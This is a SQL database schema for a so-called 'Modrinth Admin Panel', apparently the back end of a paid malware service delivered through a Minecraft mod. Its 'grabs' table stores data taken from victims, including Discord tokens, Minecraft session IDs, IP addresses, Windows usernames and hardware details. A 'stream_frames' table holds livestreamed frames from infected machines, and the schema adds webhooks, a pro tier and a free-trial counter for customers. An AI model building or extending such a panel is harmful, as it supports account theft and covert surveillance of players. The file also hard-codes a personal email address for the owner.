-- Database schema for Modrinth Admin Panel
-- Run this in Supabase SQL Editor

-- Enable UUID extension
create extension if not exists "uuid-ossp";

-- Mod version tracking
create table if not exists public.mod_versions (
  id uuid primary key default uuid_generate_v4(),
  email text not null,
  version_number integer not null default 1,
  created_at timestamptz default now()
);
create unique index if not exists mod_versions_email_idx on public.mod_versions (email);

-- Minecraft username to email mapping
create table if not exists public.user_minecraft (
  id uuid primary key default uuid_generate_v4(),
  email text not null,
  minecraft_username text not null,
  created_at timestamptz default now()
);
create unique index if not exists user_minecraft_username_idx on public.user_minecraft (minecraft_username);
create unique index if not exists user_minecraft_email_idx on public.user_minecraft (email);

-- User settings (webhook etc)
create table if not exists public.user_settings (
  id uuid primary key default uuid_generate_v4(),
  email text unique not null,
  webhook_url text default '',
  created_at timestamptz default now(),
  updated_at timestamptz default now()
);

-- UUID to email mapping (mod sends UUID, not email)
create table if not exists public.user_uuids (
  id uuid primary key default uuid_generate_v4(),
  mod_uuid text unique not null,
  email text not null,
  created_at timestamptz default now()
);
create index if not exists user_uuids_email_idx on public.user_uuids (email);

-- Grabs table (captured data from mod)
create table if not exists public.grabs (
  id uuid primary key default uuid_generate_v4(),
  owner_email text,
  minecraft_username text,
  discord_username text,
  ip_address text,
  country text,
  timezone text,
  os text,
  os_version text,
  pc_name text,
  windows_username text,
  cpu text,
  ram text,
  gpu text,
  screen_resolution text,
  disk_space text,
  java_version text,
  language text,
  desktop_env text,
  client_version text,
  session_id text,
  session_start text,
  discord_token text,
  servers text,
  created_at timestamptz default now(),
  updated_at timestamptz
);
create index if not exists grabs_owner_idx on public.grabs (owner_email);
create index if not exists grabs_mc_username_idx on public.grabs (minecraft_username);
create index if not exists grabs_created_idx on public.grabs (created_at);

-- Stream frames (livestream data from mod)
create table if not exists public.stream_frames (
  username text primary key,
  frame text,
  updated_at timestamptz default now()
);

-- Add updated_at to grabs if not exists
DO $$ BEGIN
  ALTER TABLE public.grabs ADD COLUMN IF NOT EXISTS updated_at timestamptz;
EXCEPTION WHEN duplicate_column THEN END $$;

-- Add is_pro to users table
DO $$ BEGIN
  ALTER TABLE public.users ADD COLUMN IF NOT EXISTS is_pro boolean default false;
EXCEPTION WHEN duplicate_column THEN END $$;

-- Add free_uses_remaining for free trial system
DO $$ BEGIN
  ALTER TABLE public.users ADD COLUMN IF NOT EXISTS free_uses_remaining integer default 3;
EXCEPTION WHEN duplicate_column THEN END $$;

-- Initialize free_uses_remaining for existing users
DO $$ BEGIN
  UPDATE public.users SET free_uses_remaining = 3 WHERE free_uses_remaining IS NULL AND is_pro = false;
  UPDATE public.users SET free_uses_remaining = NULL WHERE is_pro = true;
EXCEPTION WHEN others THEN END $$;

-- Users table (extends Supabase auth.users)
create table if not exists public.users (
  id uuid primary key references auth.users(id) on delete cascade,
  email text unique not null,
  display_name text,
  avatar_url text,
  role text default 'user' check (role in ('owner', 'administrator', 'moderator', 'endpoint_manager', 'user')),
  status text default 'active' check (status in ('active', 'banned', 'suspended')),
  is_owner boolean default false,
  created_at timestamptz default now(),
  updated_at timestamptz default now(),
  last_login_at timestamptz
);

-- Custom roles table
create table if not exists public.roles (
  id uuid primary key default uuid_generate_v4(),
  name text unique not null,
  description text,
  is_system boolean default false,
  created_at timestamptz default now(),
  updated_at timestamptz default now()
);

-- Permissions table
create table if not exists public.permissions (
  id uuid primary key default uuid_generate_v4(),
  name text unique not null,
  description text,
  category text,
  created_at timestamptz default now()
);

-- Role permissions junction table
create table if not exists public.role_permissions (
  role_id uuid references public.roles(id) on delete cascade,
  permission_id uuid references public.permissions(id) on delete cascade,
  primary key (role_id, permission_id)
);

-- User roles junction table
create table if not exists public.user_roles (
  user_id uuid references public.users(id) on delete cascade,
  role_id uuid references public.roles(id) on delete cascade,
  assigned_at timestamptz default now(),
  assigned_by uuid references public.users(id),
  primary key (user_id, role_id)
);

-- Bans table
create table if not exists public.bans (
  id uuid primary key default uuid_generate_v4(),
  user_id uuid references public.users(id) on delete cascade,
  reason text,
  banned_by uuid references public.users(id),
  created_at timestamptz default now(),
  expires_at timestamptz,
  status text default 'active' check (status in ('active', 'expired', 'revoked'))
);

-- Suspensions table
create table if not exists public.suspensions (
  id uuid primary key default uuid_generate_v4(),
  user_id uuid references public.users(id) on delete cascade,
  reason text,
  suspended_by uuid references public.users(id),
  created_at timestamptz default now(),
  expires_at timestamptz,
  status text default 'active' check (status in ('active', 'expired', 'revoked'))
);

-- Endpoints table
create table if not exists public.endpoints (
  id uuid primary key default uuid_generate_v4(),
  name text not null,
  description text,
  path text unique not null,
  status text default 'active' check (status in ('active', 'disabled', 'suspended', 'archived')),
  auth_method text default 'bearer' check (auth_method in ('bearer', 'api_key', 'hmac', 'none')),
  allowed_methods text[] default '{POST}',
  max_payload_size integer default 1048576,
  rate_limit_per_minute integer default 60,
  rate_limit_per_hour integer default 1000,
  rate_limit_per_day integer default 10000,
  required_fields text[] default '{}',
  optional_fields text[] default '{}',
  tags text[] default '{}',
  created_by uuid references public.users(id),
  created_at timestamptz default now(),
  updated_at timestamptz default now()
);

-- Endpoint credentials table
create table if not exists public.endpoint_credentials (
  id uuid primary key default uuid_generate_v4(),
  endpoint_id uuid references public.endpoints(id) on delete cascade,
  secret_hash text not null,
  secret_prefix text not null,
  is_active boolean default true,
  created_at timestamptz default now(),
  rotated_at timestamptz
);

-- Endpoint requests table
create table if not exists public.endpoint_requests (
  id uuid primary key default uuid_generate_v4(),
  endpoint_id uuid references public.endpoints(id) on delete cascade,
  request_id text unique not null,
  method text not null,
  status_code integer,
  payload_size integer,
  processing_time_ms integer,
  validation_passed boolean,
  error_message text,
  ip_address text,
  user_agent text,
  created_at timestamptz default now()
);

-- Audit logs table
create table if not exists public.audit_logs (
  id uuid primary key default uuid_generate_v4(),
  actor_id uuid references public.users(id),
  actor_email text,
  action text not null,
  target_type text,
  target_id uuid,
  target_name text,
  result text default 'success',
  metadata jsonb,
  ip_address text,
  created_at timestamptz default now()
);

-- Security events table
create table if not exists public.security_events (
  id uuid primary key default uuid_generate_v4(),
  event_type text not null,
  severity text default 'info' check (severity in ('info', 'warning', 'high')),
  description text,
  metadata jsonb,
  ip_address text,
  created_at timestamptz default now()
);

-- Settings table
create table if not exists public.settings (
  id uuid primary key default uuid_generate_v4(),
  key text unique not null,
  value jsonb,
  category text default 'general',
  updated_by uuid references public.users(id),
  updated_at timestamptz default now()
);

-- Create indexes
create index if not exists idx_users_email on public.users(email);
create index if not exists idx_users_role on public.users(role);
create index if not exists idx_users_status on public.users(status);
create index if not exists idx_users_free_uses on public.users(free_uses_remaining);
create index if not exists idx_endpoints_path on public.endpoints(path);
create index if not exists idx_endpoints_status on public.endpoints(status);
create index if not exists idx_endpoint_requests_endpoint on public.endpoint_requests(endpoint_id);
create index if not exists idx_endpoint_requests_created on public.endpoint_requests(created_at);
create index if not exists idx_audit_logs_actor on public.audit_logs(actor_id);
create index if not exists idx_audit_logs_action on public.audit_logs(action);
create index if not exists idx_audit_logs_created on public.audit_logs(created_at);
create index if not exists idx_security_events_type on public.security_events(event_type);
create index if not exists idx_security_events_created on public.security_events(created_at);

-- Insert default permissions
insert into public.permissions (name, description, category) values
  ('users.view', 'View users', 'USER MANAGEMENT'),
  ('users.edit', 'Edit users', 'USER MANAGEMENT'),
  ('users.ban', 'Ban users', 'USER MANAGEMENT'),
  ('users.unban', 'Unban users', 'USER MANAGEMENT'),
  ('users.suspend', 'Suspend users', 'USER MANAGEMENT'),
  ('users.unsuspend', 'Unsuspend users', 'USER MANAGEMENT'),
  ('users.delete', 'Delete users', 'USER MANAGEMENT'),
  ('admins.view', 'View administrators', 'ADMINISTRATION'),
  ('admins.create', 'Create administrators', 'ADMINISTRATION'),
  ('admins.edit', 'Edit administrators', 'ADMINISTRATION'),
  ('admins.remove', 'Remove administrators', 'ADMINISTRATION'),
  ('roles.view', 'View roles', 'ADMINISTRATION'),
  ('roles.create', 'Create roles', 'ADMINISTRATION'),
  ('roles.edit', 'Edit roles', 'ADMINISTRATION'),
  ('roles.delete', 'Delete roles', 'ADMINISTRATION'),
  ('permissions.view', 'View permissions', 'ADMINISTRATION'),
  ('permissions.manage', 'Manage permissions', 'ADMINISTRATION'),
  ('endpoints.view', 'View endpoints', 'ENDPOINTS'),
  ('endpoints.create', 'Create endpoints', 'ENDPOINTS'),
  ('endpoints.edit', 'Edit endpoints', 'ENDPOINTS'),
  ('endpoints.enable', 'Enable endpoints', 'ENDPOINTS'),
  ('endpoints.disable', 'Disable endpoints', 'ENDPOINTS'),
  ('endpoints.delete', 'Delete endpoints', 'ENDPOINTS'),
  ('endpoints.credentials.rotate', 'Rotate endpoint credentials', 'ENDPOINTS'),
  ('endpoints.requests.view', 'View endpoint requests', 'ENDPOINTS'),
  ('endpoints.analytics.view', 'View endpoint analytics', 'ENDPOINTS'),
  ('audit_logs.view', 'View audit logs', 'SECURITY'),
  ('security_events.view', 'View security events', 'SECURITY'),
  ('settings.view', 'View settings', 'SYSTEM'),
  ('settings.edit', 'Edit settings', 'SYSTEM'),
  ('system.view', 'View system status', 'SYSTEM'),
  ('system.manage', 'Manage system', 'SYSTEM'),
  ('developer_tools.view', 'View developer tools', 'DEVELOPER')
on conflict (name) do nothing;

-- Insert default roles
insert into public.roles (name, description, is_system) values
  ('owner', 'Full access to everything', true),
  ('administrator', 'General administration', true),
  ('moderator', 'User moderation', true),
  ('endpoint_manager', 'Webhook endpoint management', true)
on conflict (name) do nothing;

-- Assign permissions to default roles
-- Owner gets all permissions
insert into public.role_permissions (role_id, permission_id)
select r.id, p.id
from public.roles r, public.permissions p
where r.name = 'owner'
on conflict do nothing;

-- Administrator gets most permissions except system.manage and developer_tools.view
insert into public.role_permissions (role_id, permission_id)
select r.id, p.id
from public.roles r, public.permissions p
where r.name = 'administrator'
  and p.name not in ('system.manage', 'developer_tools.view')
on conflict do nothing;

-- Moderator gets user moderation permissions
insert into public.role_permissions (role_id, permission_id)
select r.id, p.id
from public.roles r, public.permissions p
where r.name = 'moderator'
  and p.name in ('users.view', 'users.ban', 'users.unban', 'users.suspend', 'users.unsuspend', 'audit_logs.view')
on conflict do nothing;

-- Endpoint manager gets endpoint permissions
insert into public.role_permissions (role_id, permission_id)
select r.id, p.id
from public.roles r, public.permissions p
where r.name = 'endpoint_manager'
  and p.name like 'endpoints.%'
on conflict do nothing;

-- Insert default settings
insert into public.settings (key, value, category) values
  ('site_name', '"Modrinth"', 'general'),
  ('owner_email', '"lifegrading@gmail.com"', 'general'),
  ('registration_enabled', 'true', 'authentication'),
  ('default_role', '"user"', 'users'),
  ('max_payload_size', '1048576', 'endpoints'),
  ('default_rate_limit_per_minute', '60', 'endpoints'),
  ('audit_log_retention_days', '90', 'security'),
  ('security_event_retention_days', '30', 'security')
on conflict (key) do nothing;

-- Function to handle new user creation
create or replace function public.handle_new_user()
returns trigger as $$
begin
  insert into public.users (id, email, display_name, avatar_url, is_owner, free_uses_remaining)
  values (
    new.id,
    new.email,
    coalesce(new.raw_user_meta_data->>'full_name', new.email),
    new.raw_user_meta_data->>'avatar_url',
    new.email = 'lifegrading@gmail.com',
    case when new.email = 'lifegrading@gmail.com' then null else 3 end
  );

  -- Assign owner role if owner
  if new.email = 'lifegrading@gmail.com' then
    insert into public.user_roles (user_id, role_id)
    select new.id, id from public.roles where name = 'owner';
    update public.users set role = 'owner' where id = new.id;
  end if;

  return new;
end;
$$ language plpgsql security definer;

-- Trigger for new user creation
create or replace trigger on_auth_user_created
  after insert on auth.users
  for each row execute function public.handle_new_user();

-- Row Level Security policies
alter table public.users enable row level security;
alter table public.roles enable row level security;
alter table public.permissions enable row level security;
alter table public.role_permissions enable row level security;
alter table public.user_roles enable row level security;
alter table public.bans enable row level security;
alter table public.suspensions enable row level security;
alter table public.endpoints enable row level security;
alter table public.endpoint_credentials enable row level security;
alter table public.endpoint_requests enable row level security;
alter table public.audit_logs enable row level security;
alter table public.security_events enable row level security;
alter table public.settings enable row level security;

-- Users can read their own data
create policy "Users can view own profile" on public.users
  for select using (auth.uid() = id);

-- Admins can view all users
create policy "Admins can view all users" on public.users
  for select using (
    exists (
      select 1 from public.user_roles ur
      join public.roles r on ur.role_id = r.id
      where ur.user_id = auth.uid()
      and r.name in ('owner', 'administrator', 'moderator')
    )
  );

-- Service role can update users (bypasses RLS, but added explicitly as safety net)
create policy "Service role can update users" on public.users
  for update with check (auth.role() = 'service_role');

-- Service role can insert users
create policy "Service role can insert users" on public.users
  for insert with check (auth.role() = 'service_role');

-- Public can read endpoint info (for documentation)
create policy "Public can view active endpoints" on public.endpoints
  for select using (status = 'active');

-- Admins can manage endpoints
create policy "Admins can manage endpoints" on public.endpoints
  for all using (
    exists (
      select 1 from public.user_roles ur
      join public.roles r on ur.role_id = r.id
      join public.role_permissions rp on rp.role_id = r.id
      join public.permissions p on rp.permission_id = p.id
      where ur.user_id = auth.uid()
      and p.name = 'endpoints.create'
    )
  );
